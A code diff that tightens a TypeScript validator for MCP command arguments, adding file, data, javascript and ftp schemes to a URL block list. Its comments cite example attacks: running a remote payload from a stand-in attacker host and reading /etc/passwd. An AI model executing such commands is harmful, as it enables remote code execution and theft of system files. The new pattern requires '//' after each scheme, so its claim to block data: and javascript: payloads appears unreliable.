@@ -41,8 +41,9 @@ function validateMcpArgs(command: string, args: string[]): void {
         throw new Error(`Argument '${arg}' is not permitted for command '${command}'`)
       }
     }
-    // Block URLs in args (prevents deno run https://evil.com/payload.ts)
-    if (/^https?:\/\//i.test(arg)) {
+    // Block all URI scheme arguments (prevents deno run https://evil.com/payload.ts,
+    // file:///etc/passwd reads, data: payloads, javascript: injection, etc.)
+    if (/^(https?|file|data|javascript|ftp):\/\//i.test(arg)) {
       throw new Error(`URL arguments are not permitted: ${arg}`)
     }
   }
